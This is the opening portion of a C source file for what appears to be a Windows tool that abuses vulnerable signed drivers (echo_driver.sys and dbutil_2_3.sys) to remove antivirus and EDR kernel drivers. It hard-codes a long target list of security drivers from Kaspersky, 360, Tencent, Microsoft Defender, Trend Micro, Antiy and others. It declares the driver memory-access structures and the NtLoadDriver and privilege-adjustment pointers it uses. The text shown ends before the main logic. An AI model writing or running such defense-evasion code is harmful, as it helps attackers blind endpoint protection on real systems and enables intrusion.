#include<windows.h>
#include<stdio.h>
#include<winternl.h>
#include<psapi.h>
#include <time.h>
#pragma comment(lib,"ntdll.lib")

/*
Driver_Type specifies different drivers
1 -> echo_driver.sys driver, supports win10+
2 -> dbutil_2_3.sys driver, supports Win7+ (may not be loaded in higher versions such as win11)
*/

INT Driver_Type = 0;

//Specify the location of the driver
CHAR* DrivePath = NULL;

//Set the driver name to be cleared
CONST CHAR* AVDriver[] = {
	"klflt.sys","klhk.sys","klif.sys","klupd_KES-21-9_arkmon.sys","KLIF.KES-21-9.sys","klbackupflt.KES-21-9.sys","klids.sys","klupd_klif_arkmon.sys",
	"QaxNfDrv.sys","QKBaseChain64.sys","QKNetFilter.sys","QKSecureIO.sys","QesEngEx.sys","QkHelp64.sys","qmnetmonw64.sys",
	"QMUdisk64_ev.sys","QQSysMonX64_EV.sys","TAOKernelEx64_ev.sys","TFsFltX64_ev.sys","TAOAcceleratorEx64_ev.sys","QQSysMonX64.sys","TFsFlt.sys",
	"sysdiag_win10.sys","sysdiag.sys",
	"360AvFlt.sys",
	"360qpesv64.sys","360AntiSteal64.sys","360AntiSteal.sys","360qpesv.sys","360FsFlt.sys","360Box64.sys","360netmon.sys","360AntiHacker64.sys","360Hvm64.sys","360qpesv64.sys","360AntiHijack64.sys","360AntiExploit64.sys","DsArk64.sys","360Sensor64.sys","DsArk.sys", 
	"WdFilter.sys","MpKslDrv.sys","mpsdrv.sys","WdNisDrv.sys","win32k.sys",
	"TmPreFilter.sys","TmXPFlt.sys",
	"AHipsFilter.sys","AHipsFilter64.sys","GuardKrnl.sys","GuardKrnl64.sys","GuardKrnlXP64.sys","protectdrv.sys","protectdrv64.sys","AntiyUSB.sys","AntiyUSB64.sys","AHipsXP.sys","AHipsXP64.sys","AtAuxiliary.sys","AtAuxiliary64.sys","TrustSrv.sys","TrustSrv64.sys",
	NULL
};

typedef struct _RTL_PROCESS_MODULE_INFORMATION
{
	HANDLE Section;
	PVOID MappedBase;
	PVOID ImageBase;
	ULONG ImageSize;
	ULONG Flags;
	USHORT LoadOrderIndex;
	USHORT InitOrderIndex;
	USHORT LoadCount;
	USHORT OffsetToFileName;
	UCHAR FullPathName[256];
} RTL_PROCESS_MODULE_INFORMATION;

typedef struct _RTL_PROCESS_MODULES
{
	ULONG NumberOfModules;
	RTL_PROCESS_MODULE_INFORMATION Modules[1];
} RTL_PROCESS_MODULES, * PRTL_PROCESS_MODULES;

typedef struct {
	DWORD pid;
	ACCESS_MASK access;
	HANDLE handle;
}GetHandle;

typedef struct {
	HANDLE targetProcess;
	void* fromAddress;
	void* toAddress;
	size_t length;
	void* padding;
	UINT returnCode;
}ReadMem;

struct DellBuff {
	ULONGLONG pad1 = 0x4141414141414141;
	ULONGLONG Address = 0;
	ULONGLONG three1 = 0x0000000000000000;
	ULONGLONG value = 0x0000000000000000;
} DellBuff;

typedef VOID(__stdcall* RtlInitUnicodeStringPtr) (IN OUT PUNICODE_STRING  DestinationString, IN wchar_t* SourceString);
typedef NTSTATUS(WINAPI* RtlAdjustPrivilegePtr)(IN ULONG Privilege, IN BOOL Enable, IN BOOL CurrentThread, OUT PULONG pPreviousState);
typedef NTSTATUS(WINAPI* NtLoadDriverPtr)(const UNICODE_STRING*);
typedef NTSTATUS(WINAPI* NtUnLoadDriverPtr)(const UNICODE_STRING*);
typedef void(__stdcall* NTPROC)(DWORD*, DWORD*, DWORD*);